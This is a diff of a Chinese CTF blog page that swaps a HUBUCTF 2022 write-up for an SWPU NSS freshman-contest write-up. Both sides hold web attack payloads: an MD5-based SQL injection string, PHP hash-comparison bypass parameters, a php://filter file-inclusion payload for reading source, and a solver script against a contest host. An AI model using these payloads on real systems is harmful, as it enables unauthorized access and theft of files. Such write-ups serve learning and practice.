@@ -4,13 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="HUBUCTF 2022, sahna">
-    <meta name="description" content="checkin源码
-&amp;lt;?php
-show_source(__FILE__);
-$username  = &#34;this_is_secret&#34;; 
-$password  = &#34;this_is_not_known_to_you&#34;; 
-incl">
+    <meta name="keywords" content="SWPU NSS新生赛, sahna">
+    <meta name="description" content="奇妙的MD5提示：ctf 中一个奇妙的字符串+md5
+
+ffifdyop
+经过md5加密后：276f722736c95d99e921722cf9ed621c
+再转换为字符串：’or’6&amp;lt;乱码&amp;gt; 即  &amp;#39;or&amp;#39;66">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +21,7 @@ incl">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>HUBUCTF 2022 | sahna</title>
+    <title>SWPU NSS新生赛 | sahna</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -211,7 +210,7 @@ incl">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">HUBUCTF 2022</h1>
+                    <h1 class="description center-align post-title">SWPU NSS新生赛</h1>
                 </div>
             </div>
         </div>
@@ -245,7 +244,7 @@ incl">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-09-30
+                    2022-10-02
                 </div>
                 
 
@@ -254,7 +253,7 @@ incl">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    167
+                    187
                 </div>
                 
 
@@ -279,90 +278,59 @@ incl">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a><strong>checkin</strong></h3><p>源码</p>
+                <h3 id="奇妙的MD5"><a href="#奇妙的MD5" class="headerlink" title="奇妙的MD5"></a><strong>奇妙的MD5</strong></h3><p>提示：ctf 中一个奇妙的字符串+md5</p>
+<blockquote>
+<p><strong>ffifdyop</strong></p>
+<p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p>
+<p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code> </p>
+<p>用途：</p>
+<p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’ </p>
+<p>就相当于select * from admin where password&#x3D;’’or 1 实现sql注入</p>
+</blockquote>
+<p>页面跳转后，查看源码：</p>
+<img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221002111009637.png" style="zoom:80%;" />
+
+<p>get传参：</p>
+<blockquote>
+<p>?x&#x3D;s155964671a&amp;y&#x3D;s214587387a</p>
+</blockquote>
+<p>post传参：</p>
+<blockquote>
+<p>wqh[]&#x3D;1&amp;dsy[]&#x3D;2</p>
+</blockquote>
+<img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221002111439913.png" style="zoom: 50%;" />
+
+
+
+<h3 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h3><p>源码：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$username</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_secret"</span><span class="token punctuation">;</span> 
-<span class="token variable">$password</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"this_is_not_known_to_you"</span><span class="token punctuation">;</span> 
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//here I changed those two </span>
-<span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">;</span>
-<span class="token variable">$data_unserialize</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$username</span><span class="token operator">&amp;&amp;</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"username or password error!"</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"php"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Nice!!!"</span><span class="token punctuation">;</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> 
 
+    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
-
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>php弱比较&#x3D;&#x3D;绕过</p>
-<p>构造exp<img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930111533320.png"></p>
-<p>回显flag</p>
-<p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930111749797.png"></p>
-<h3 id="HowToGetShell"><a href="#HowToGetShell" class="headerlink" title="HowToGetShell"></a><strong>HowToGetShell</strong></h3><p>源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$mess</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z]/"</span><span class="token punctuation">,</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"invalid input!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$mess</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">//flag.php </span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-<p>无字母数字RCE</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166029976116782246437375%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166029976116782246437375&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-109143413-null-null.142%5Ev40%5Epc_rank_34_1,185%5Ev2%5Econtrol&utm_term=%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">贴篇博客</a></p>
-<p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20220930160345370.png"></p>
-<h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a><strong>ezsql</strong></h3><h3 id="Calculate"><a href="#Calculate" class="headerlink" title="Calculate"></a><strong>Calculate</strong></h3><p>跑脚本</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> re
-
-url <span class="token operator">=</span> <span class="token string">'http://1.14.71.254:28638/'</span>
-ses <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
-reg <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">">(.)&lt;/div"</span><span class="token punctuation">)</span>
-<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-    get <span class="token operator">=</span> ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-    math <span class="token operator">=</span> reg<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>get<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-    final <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-    result <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-    post <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"ans"</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> <span class="token string">'NSS'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
-        <span class="token keyword">break</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p>php伪协议：</p>
+<blockquote>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+</blockquote>
+<p>base64解码后，提示：</p>
+<p><img src="https://sahna.oss-cn-hangzhou.aliyuncs.com/blog/image-20221002113851714.png" alt="image-20221002113851714"></p>
+<p>payload修改为：</p>
+<blockquote>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</p>
+</blockquote>
 
                 
             </div>
@@ -389,7 +357,7 @@ reg <span class="token operator">=</span> re<span class="token punctuation">.</s
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://sahna03.github.io/2022/09/30/wp/">http://sahna03.github.io/2022/09/30/wp/</a>
+                    <a href="http://sahna03.github.io/2022/10/02/SWPU%E6%96%B0%E7%94%9F%E8%B5%9B/">http://sahna03.github.io/2022/10/02/SWPU%E6%96%B0%E7%94%9F%E8%B5%9B/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -467,17 +435,18 @@ reg <span class="token operator">=</span> re<span class="token punctuation">.</s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/09/30/NewStarCTF2022/">
+                <a href="/2022/10/02/SWPU%E6%96%B0%E7%94%9F%E8%B5%9B/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="NewStarCTF2022">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="SWPU NSS新生赛">
                         
-                        <span class="card-title">NewStarCTF2022</span>
+                        <span class="card-title">SWPU NSS新生赛</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -487,9 +456,9 @@ reg <span class="token operator">=</span> re<span class="token punctuation">.</s
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-02
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -498,6 +467,7 @@ reg <span class="token operator">=</span> re<span class="token punctuation">.</s
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -505,16 +475,16 @@ reg <span class="token operator">=</span> re<span class="token punctuation">.</s
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/09/30/wp/">
+                <a href="/2022/09/30/NewStarCTF2022/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="HUBUCTF 2022">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="NewStarCTF2022">
                         
-                        <span class="card-title">HUBUCTF 2022</span>
+                        <span class="card-title">NewStarCTF2022</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -535,7 +505,6 @@ reg <span class="token operator">=</span> re<span class="token punctuation">.</s
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
